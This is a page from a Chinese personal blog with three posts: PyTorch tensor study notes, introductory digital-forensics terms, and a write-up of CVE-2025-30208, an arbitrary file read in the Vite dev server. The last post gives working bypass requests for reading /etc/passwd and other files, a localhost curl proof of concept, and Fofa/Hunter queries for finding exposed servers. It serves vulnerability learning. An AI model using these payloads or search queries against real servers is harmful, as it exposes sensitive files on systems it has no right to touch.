<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="路漫漫其修远兮 吾将上下而求索">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="路漫漫其修远兮 吾将上下而求索">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Cnext">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>路漫漫其修远兮 吾将上下而求索</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">路漫漫其修远兮 吾将上下而求索</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/15/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-3-day/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Cnext">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="路漫漫其修远兮 吾将上下而求索">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/15/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-3-day/" class="post-title-link" itemprop="url">深度学习-3.day</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-04-15 20:47:13 / 修改时间：22:00:43" itemprop="dateCreated datePublished" datetime="2025-04-15T20:47:13+08:00">2025-04-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">深度学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="从张量基础知识开始"><a href="#从张量基础知识开始" class="headerlink" title="从张量基础知识开始"></a>从张量基础知识开始</h1><p><strong>学到的</strong></p>
<p>·张量，是pytorch中的最基本的数据结构</p>
<p>·张量的索引与运算</p>
<p>·与NumPy多维数组交互操作</p>
<p>·将计算移动到GPU以提高速度</p>
<p>深度学习实际上需要构建一个能将数据从一种转化为另一种表示的系统，系统可以正确的将具有给定形状和颜色的图像映射到标签上</p>
<h3 id="实际数据转化为浮点数"><a href="#实际数据转化为浮点数" class="headerlink" title="实际数据转化为浮点数"></a>实际数据转化为浮点数</h3><p>浮点数是网络处理信息的方式，深度学习的神经网络通常在不同阶段学习将数据从一种形式转化为另一种形式，每一个阶段转换的数据可以被认为是一个中间表征序列，这些中间表征都是浮点数的集合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入表征（像素值）-------&gt;中间表征（浮点数集合)-------&gt;输出表征(类的概率)</span><br></pre></td></tr></table></figure>

<p>开始将数据转化为浮点数输入之前，必须要对pytorch如何处理和存储数据有深入的理解</p>
<p>为此，pytorch引入了张量这个而基本的数据结构，在深度学习中张量可以将向量和矩阵推广到任意维度</p>
<h3 id="张量：多维数组"><a href="#张量：多维数组" class="headerlink" title="张量：多维数组"></a>张量：多维数组</h3><h5 id="从列表到张量"><a href="#从列表到张量" class="headerlink" title="从列表到张量"></a>从列表到张量</h5><p>列表的索引的作用是众所周知的，可以用对应的索引来访问相对应位置的数据，这可以用来类比张量中的索引</p>
<h5 id="构造第一个张量"><a href="#构造第一个张量" class="headerlink" title="构造第一个张量"></a>构造第一个张量</h5><p>来构造第一个pytorch张量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import torch</span><br><span class="line">a = torch.ones(3)</span><br><span class="line"># 解释：torch.ones(3)创建了一个长度为3的一维张量，其中所有元素都被初始化为1</span><br><span class="line"># 所以当我们打印这个张量时，会看到3个1</span><br><span class="line">print(f&quot;这是一个一维张量，包含 &#123;len(a)&#125; 个元素: &#123;a&#125;&quot;)</span><br><span class="line">print(a[1])#访问到第二个位置的数据</span><br></pre></td></tr></table></figure>

<p>虽然看起来和列表差不多，但实际上是完全不一样的</p>
<h5 id="张量的本质"><a href="#张量的本质" class="headerlink" title="张量的本质"></a>张量的本质</h5><p>张量通常是连续的内存块的视图，这些内存块包含未装箱的数字类型</p>
<p>假设有一个坐标列表，用它来表示一个几何对象，如一个二维三角形，顶点有三个，我们可以使用一维张量，将x轴坐标储存在偶数索引中，将y轴坐标储存在奇数索引中，而不是在列表中使用数字来 表示坐标，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">points = torch.zeros(6) </span><br><span class="line">points[0] = 4.0 </span><br><span class="line">points[1] = 1.0 </span><br><span class="line">points[2] = 5.0 </span><br><span class="line">points[3] = 3.0 </span><br><span class="line">points[4] = 2.0 </span><br><span class="line">points[5] = 1.0 </span><br></pre></td></tr></table></figure>

<p>也可以像构造函数传递一个列表达到相同的效果，如下图所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">points = torch.tensor([4.0, 1.0, 5.0, 3.0, 2.0, 1.0]) </span><br><span class="line">points </span><br></pre></td></tr></table></figure>

<p>尽管将第一个索引单独指向二维点而不是点是可行的，我们可以使用一个二维张量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">points = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) </span><br><span class="line">points </span><br></pre></td></tr></table></figure>

<p>可以通过shape属性来查看张量的形状</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">points.shape</span><br><span class="line">输出</span><br><span class="line">torch.Size([3, 2])</span><br></pre></td></tr></table></figure>

<p>我们就可以知道每一个维度上张量的带线啊哦，我们还可以使用zeros方法和ones方法来初始化张量，以元组的形式来指定大小</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">points = torch.zeros(3, 2) </span><br><span class="line">points</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">tensor([[0., 0.],</span><br><span class="line">		[0., 0.],         </span><br><span class="line">		[0., 0.]])</span><br></pre></td></tr></table></figure>

<p>我们可以使用两个索引来访问呢张量中单个元素</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">points[0, 1]</span><br><span class="line">输出</span><br><span class="line">tensor(1.)#返回第0个点的y坐标，可以理解为二维数组访问元素的方法</span><br></pre></td></tr></table></figure>

<h3 id="索引张量"><a href="#索引张量" class="headerlink" title="索引张量"></a>索引张量</h3><p>如果我们需要得到张量中除了第一个点之外的所有点，我们九十一使用列表中的切片，如在列表中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">some_list = list(range(6)) </span><br><span class="line">some_list[:] #全部切片</span><br><span class="line">some_list[1:4] #第二个到第三个</span><br><span class="line">some_list[1:] #第二个以后</span><br><span class="line">some_list[:4] #第一个到第三个</span><br><span class="line">some_list[::1] #所有元素</span><br><span class="line">some_list[1:4:2]#第二个到第三个，步长为2</span><br></pre></td></tr></table></figure>

<p>在张量中，可以使用相同的表示法，在每一个维度都可以使用范围索引</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">points[1:] #第一行后的所有行，包含所有列</span><br><span class="line">points[1:, :] #第一行后的所有行，所有列</span><br><span class="line">points[1:, 0] #第一行后的所有行，第一列</span><br><span class="line">points[None]#增加大小为1的维度</span><br></pre></td></tr></table></figure>

<h3 id="命名张量"><a href="#命名张量" class="headerlink" title="命名张量"></a>命名张量</h3><p>张量的维度或者是坐标轴通常用来表示诸如像素位置或者是颜色通道的信息，当我们需要将一个张量作为索引的时候，我们需要记住维度的顺序并以此顺序些索引</p>
<p>假设有一个img_t的三维向量，为了简单，使用虚拟数据，将其转换为灰度图像，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img_t = torch.randn(3, 5, 5) # shape [channels, rows, columns] weights = torch.tensor([0.2126, 0.7152, 0.0722])</span><br></pre></td></tr></table></figure>

<p>如果希望代码具有通用性，从表示为具有高度和宽度的二维张量的灰度图像到添加第三个通道的彩色图像，或者从单幅图像到一批图像，假设增加的维度是2：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">batch_t = torch.randn(2, 3, 5, 5) # shape [batch, channels, rows, columns]</span><br></pre></td></tr></table></figure>

<p>rgb通道有时候在第0维，有时在第一维，我们可以通过从末端开始计数来归纳，总是在从末端开始的第三维中，因此惰性的未加权平均值可以写成下面的形式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">img_gray_naive = img_t.mean(-3) </span><br><span class="line">batch_gray_naive = batch_t.mean(-3) </span><br><span class="line">img_gray_naive.shape, batch_gray_naive.shape </span><br><span class="line">解释</span><br><span class="line">- 代码功能 ：</span><br><span class="line"></span><br><span class="line">- img_t.mean(-3) 和 batch_t.mean(-3) 都是沿着通道维度（第-3维）计算平均值</span><br><span class="line">- 这种计算方式被称为&quot;惰性&quot;或&quot;未加权&quot;灰度转换，因为它简单地对RGB通道取均值</span><br><span class="line">- 维度解释 ：</span><br><span class="line"></span><br><span class="line">- 对于单张图像 img_t (形状为 [C,H,W])：</span><br><span class="line">  - -3 表示通道维度（通常是第0维）</span><br><span class="line">  - 计算后会得到形状为 [H,W] 的灰度图</span><br><span class="line">- 对于批量图像 batch_t (形状为 [N,C,H,W])：</span><br><span class="line">  - -3 仍然是通道维度（第1维）</span><br><span class="line">  - 计算后会得到形状为 [N,H,W] 的批量灰度图</span><br><span class="line">  </span><br><span class="line">  灰度图：灰度图（Grayscale Image）是指仅包含亮度信息而不包含颜色信息的图像</span><br></pre></td></tr></table></figure>

<p>pytorch允许我们对相同形状的张量进行乘法运算，也允许与给定维度中其中一个操作数大小为1的张量进行计算，他还会自动附加大小为1 的前导维度，这个特性别称之为广播</p>
<p>当创建和使用张量的位置在很远的时候，就很容易出现错误，可以给维度指定一个名称，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">weights_named = torch.tensor([0.2126, 0.7152, 0.0722], names=[&#x27;channels&#x27;]) weights_named</span><br><span class="line">输出</span><br><span class="line">tensor([0.2126, 0.7152, 0.0722], names=(&#x27;channels&#x27;,))</span><br></pre></td></tr></table></figure>

<p>当我们已经有一个张量并且想要为其添加名称但不改变现有的名称时，我们可以对其调用refine_names()方法。与索引类似，省略号（…）允许你省略任意数量的维度。使用rename()兄弟方法，还可以覆盖或删除（通过传入None）现有名称：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">img_named = img_t.refine_names(..., &#x27;channels&#x27;, &#x27;rows&#x27;, &#x27;columns&#x27;) batch_named = batch_t.refine_names(..., &#x27;channels&#x27;, &#x27;rows&#x27;, &#x27;columns&#x27;) </span><br><span class="line">print(&quot;img named:&quot;, img_named.shape, img_named.names) </span><br><span class="line">print(&quot;batch named:&quot;, batch_named.shape, batch_named.names) </span><br><span class="line"></span><br><span class="line">img named: torch.Size([3, 5, 5]) (&#x27;channels&#x27;, &#x27;rows&#x27;, &#x27;columns&#x27;) batch named: torch.Size([2, 3, 5, 5]) (None, &#x27;channels&#x27;, &#x27;rows&#x27;, &#x27;columns&#x27;) </span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/14/%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81-1day/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Cnext">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="路漫漫其修远兮 吾将上下而求索">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/14/%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81-1day/" class="post-title-link" itemprop="url">数据取证-1day</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-04-14 23:11:33" itemprop="dateCreated datePublished" datetime="2025-04-14T23:11:33+08:00">2025-04-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-04-15 22:01:02" itemprop="dateModified" datetime="2025-04-15T22:01:02+08:00">2025-04-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%8F%96%E8%AF%81/" itemprop="url" rel="index"><span itemprop="name">取证</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="初探取证"><a href="#初探取证" class="headerlink" title="初探取证"></a>初探取证</h1><h2 id="电子数据取证专业名词术语"><a href="#电子数据取证专业名词术语" class="headerlink" title="电子数据取证专业名词术语"></a>电子数据取证专业名词术语</h2><h6 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a><strong>临时文件</strong></h6><p>计算机使用过程中产生的临时数据，这些临时文件有时也可以给我们的调查提供一些线索</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">系统临时文件</span><br><span class="line">C:\Windows\Temp\*.tmp</span><br><span class="line">IE访问临时文件</span><br><span class="line">C:\Documents and Settings\Username\Local Settings\Temporary Internet Files</span><br><span class="line">office文档编辑时产生的临时文件</span><br><span class="line">C:\Documnets and Settings\Administrator\Application Data\Microsoft\Word</span><br></pre></td></tr></table></figure>

<h6 id="历史记录"><a href="#历史记录" class="headerlink" title="历史记录"></a><strong>历史记录</strong></h6><p>是指多数计算机程序在运行的过程中产生的 记录信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在浏览器中，历史记录是指浏览器曾经访问过的网站在计算机中存在的信息</span><br><span class="line">iis访问日志记录服务器的一些状况和访问ip的来源和登录情况等</span><br></pre></td></tr></table></figure>

<h6 id="未分配簇"><a href="#未分配簇" class="headerlink" title="未分配簇"></a><strong>未分配簇</strong></h6><p>是指哪些在当前文件系统中没有被分配的空间，数据恢复就是从将那些在磁盘上已删除的文件但空间地址未被覆盖，</p>
<p>在这里讲一下数据恢复的概念</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比如你有一个文件，但是现在你把他删除了，你表面上是看不到这个文件了，但其实是这个文件隐藏起来了，文件资源管理器会对电脑发出指令，这个文件的内存地址我不需要了，你爱咋咋地，也就是后面新来的数据会直接覆盖在上面，如果被删除的文件的内存地址尚未被覆盖，那么就可以使用恢复工具进行恢复</span><br></pre></td></tr></table></figure>

<p>未分配簇中可能包含大量重要的证据信息，只要数据未被覆盖，可以通过相关技术检索到或直接恢复，这是非常重要的</p>
<p>可以在取证软件中查看未分配簇内容，包含曾经被删除的数据</p>
<h6 id="文件残留区"><a href="#文件残留区" class="headerlink" title="文件残留区"></a><strong>文件残留区</strong></h6><p>文件残留区是指文件逻辑大小到物理大小末尾之间的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|---------------------------------------|----------------|</span><br><span class="line">|&lt;--------------逻辑大小----------------&gt;|&lt;----文件残留区-&gt;|</span><br><span class="line">|&lt;--------------------------物理大小---------------------&gt;|</span><br></pre></td></tr></table></figure>

<p>簇：文件储存的最小单位，簇是有多个扇区组成</p>
<p><strong>隐藏文件的方式</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">硬盘加密，压缩包加密，bitlocker加密，office文件加密，虚拟容器加密，修改文件拓展名，EFS文件加密，信息隐写</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/14/CVE-2025-30208/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Cnext">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="路漫漫其修远兮 吾将上下而求索">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/14/CVE-2025-30208/" class="post-title-link" itemprop="url">CVE-2025-30208</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-04-14 23:10:32" itemprop="dateCreated datePublished" datetime="2025-04-14T23:10:32+08:00">2025-04-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-04-15 21:59:34" itemprop="dateModified" datetime="2025-04-15T21:59:34+08:00">2025-04-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="CVE-2025-30208"><a href="#CVE-2025-30208" class="headerlink" title="CVE-2025-30208"></a>CVE-2025-30208</h1><p>也是今天打题的时候，遇到的一个特别有意思的服务器漏洞，在这里记录一下，利用难度也不是很大</p>
<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>CVE-2025-30208 是 Vite 开发服务器中的一个任意文件读取漏洞。该漏洞允许攻击者通过特定的 URL 参数绕过访问控制，从而读取服务器上的敏感文件（如 &#x2F;etc&#x2F;passwd 或 C:\windows\win.ini）。</p>
<p>该漏洞主要影响以下版本的 Vite：</p>
<p>6.2.3 之前<br>6.1.2 之前<br>6.0.12 之前<br>5.4.15 之前<br>4.5.10 之前</p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Vite <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8&spm=1001.2101.3001.7020">开发服务器</a>提供 <code>@fs</code> 机制，用于防止访问 Vite 允许列表之外的文件。然而，由于 URL 解析时的正则表达式处理不当，攻击者可以通过 <code>?raw??</code> 或 <code>?import&amp;raw??</code> 等查询参数绕过访问限制，从而读取任意文件。</p>
<p>详细分析<br>在 Vite 服务器的 URL 处理逻辑中，@fs 机制原本用于限制对非白名单目录的访问，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server: &#123;</span><br><span class="line">  fs: &#123;</span><br><span class="line">    allow: [path.resolve(__dirname, &#x27;src&#x27;)]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然而，Vite 在 URL 解析过程中会移除部分特殊字符，而未正确考虑查询参数的影响，导致攻击者可以构造类似如下的请求绕过安全检查：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /@fs/etc/passwd?raw??</span><br><span class="line">GET /@fs/etc/passwd?import&amp;raw??</span><br></pre></td></tr></table></figure>

<p>由于 Vite 解析 URL 时未正确处理这些参数，导致绕过 server.fs.allow 限制，并返回任意文件内容。</p>
<p>漏洞利用<br>Fofa &amp; Hunter 搜索<br>攻击者可使用以下测绘语句搜索可能受影响的 Vite 服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Fofa:</span><br><span class="line">body=&quot;/@vite/client&quot;</span><br><span class="line"></span><br><span class="line">Hunter:</span><br><span class="line">web.body=&quot;/@vite/client&quot;</span><br><span class="line">PoC（概念验证）</span><br><span class="line">启动 Vite 服务器：</span><br><span class="line"></span><br><span class="line">$ npm create vite@latest</span><br><span class="line">$ cd vite-project/</span><br><span class="line">$ npm install</span><br><span class="line">$ npm run dev</span><br><span class="line">创建测试文件：</span><br><span class="line"></span><br><span class="line">$ echo &quot;top secret content&quot; &gt; /tmp/secret.txt</span><br><span class="line">发送漏洞利用请求：</span><br><span class="line"></span><br><span class="line">### </span><br></pre></td></tr></table></figure>

<h3 id="正常情况下被拒绝"><a href="#正常情况下被拒绝" class="headerlink" title="正常情况下被拒绝"></a>正常情况下被拒绝</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl &quot;http://localhost:5173/@fs/tmp/secret.txt&quot;</span><br></pre></td></tr></table></figure>

<h3 id="绕过访问控制"><a href="#绕过访问控制" class="headerlink" title="绕过访问控制"></a>绕过访问控制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl &quot;http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw??&quot;</span><br><span class="line">export default &quot;top secret content\n&quot;</span><br><span class="line">漏洞验证</span><br><span class="line">GET /etc/passwd?import&amp;raw?? HTTP/1.1</span><br><span class="line">Host: ********</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
